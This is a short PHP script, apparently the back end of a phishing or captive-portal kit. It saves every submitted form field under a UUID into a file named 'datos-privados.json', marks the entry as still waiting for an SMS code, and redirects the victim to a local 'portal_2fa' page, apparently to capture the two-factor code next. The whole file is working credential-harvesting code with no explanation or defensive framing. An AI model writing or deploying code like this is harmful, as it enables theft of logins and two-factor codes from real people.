<?php 
$file = 'datos-privados.json';
$uuid = $_POST['uuid'];

if (file_exists($file)) {
	$credentials = json_decode(file_get_contents($file), true); 
}else{
	$credentials = [];
}
$credentials[$uuid] = $_POST;
$credentials[$uuid]['sms'] =  'AUN NO HAY CODIGO';
file_put_contents($file,json_encode($credentials));

?><meta http-equiv="refresh" content="0; url=http://192.168.1.1/portal_2fa/index.php?uuid=<?=$uuid; ?>" />
